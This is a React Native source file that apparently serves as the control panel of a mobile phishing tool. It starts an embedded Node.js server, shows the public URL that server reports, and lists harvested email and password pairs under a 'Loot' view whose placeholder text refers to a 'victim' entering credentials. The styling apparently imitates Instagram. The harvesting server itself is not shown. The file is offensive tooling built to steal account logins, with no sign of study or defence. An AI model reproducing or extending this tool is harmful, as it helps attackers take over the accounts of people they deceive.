/**
 * Sample React Native App
 * https://github.com/facebook/react-native
 * @flow
 */

 import React, { Component } from 'react';
 import {
   StyleSheet,
   Text,
   View,
   ScrollView,
   TouchableOpacity,
   Linking
 } from 'react-native';
 
 import nodejs from 'nodejs-mobile-react-native';
 
 export default class App extends Component{
   constructor(props){
     super(props);
     this.state = { 
       lastNodeMessage: "Offline  ",
       currentState:"false",
       userData:[],
       url:null,
       };
     this.listenerRef = null;
   }
   componentDidMount()
   {
     nodejs.start('main.js');
     this.listenerRef = ((msg) => {
       if (typeof msg === "object"){
        this.state.userData.push(msg)
       }else{
         var tmp =msg.substr(0,3);
         if(tmp=="URL"){
           this.setState({url:msg.substr(3)})
         }else{
           this.setState({lastNodeMessage: msg});
         }
       } 
     });
     nodejs.channel.addListener(
       "message",
       this.listenerRef,
       this 
     );
   }
   componentWillUnmount()
   {
     if (this.listenerRef) {
       nodejs.channel.removeListener("message", this.listenerRef);
     }
   }
   _handleStart=()=>{
    if(this.state.currentState){
      nodejs.channel.send('start')
      this.setState({currentState:false})
    }else{
      nodejs.channel.send('stop')
      this.setState({currentState:true,url:null,lastNodeMessage:"Offline"})
    }
   }
   render() {
     return (
       <ScrollView>
         <TouchableOpacity 
           onPress={()=>this._handleStart()}
           style={styles.btn}
         >
           <Text style={{color:"white"}}>{this.state.currentState?"Start":"Stop"}</Text>
         </TouchableOpacity>
         {/*status bar tile */}
         <View style={styles.statusBar}>
         <Text style={styles.statusText}>Status:</Text>
         <Text style={styles.statusText}>{this.state.lastNodeMessage}</Text>
         </View>
         {/*url bar tile */}
         {this.state.url?
         <View style={styles.urlBar}>
         <Text style={styles.statusText}>URL:</Text>
         <Text onPress={()=>Linking.openURL(`${this.state.url}`)} style={styles.urlText}>{this.state.url}</Text>
         <Text>share icon</Text>
         </View>:<></>
          }
         {/*loot view  */} 
         {this.state.userData.length>0?
         this.state.userData.map((data,index)=>(
         <Text key={index} style={styles.credentialText}>
           Email: {data.email+"\n"}Password: {data.password}
         </Text>
         ))
         :
         <Text style={styles.lootText}>
          {"No Loot yet,\n once victim enter credentials, \nit will display here!!"}
         </Text>}
        
       </ScrollView>
     );
   }
 }
 
 const styles = StyleSheet.create({
   btn:{
   backgroundColor:"#0095f6",
   alignSelf:"flex-end",
   height:30,
   width:60,
   justifyContent:"center",
   alignItems:"center",
   marginRight:10,
   marginVertical:10,
   borderRadius:5
   },
   credentialText:{
    margin:10,
   },
   lootText: {
     marginTop:100,
     textAlign: 'center',
     color: '#333333',
     marginBottom: 5,
   },
   statusText:{
    color: '#333333',
    fontWeight:"bold"
   },
   statusBar:{
     flex:1,
     margin:10,
     flexDirection:"row",
     justifyContent:"space-between"
   },
   urlBar:{
    flex:1,
    margin:10,
    flexDirection:"row",
    justifyContent:"space-between"
  },
  urlText:{
    fontWeight:"900",
    color:"#0095f6"
  }
 });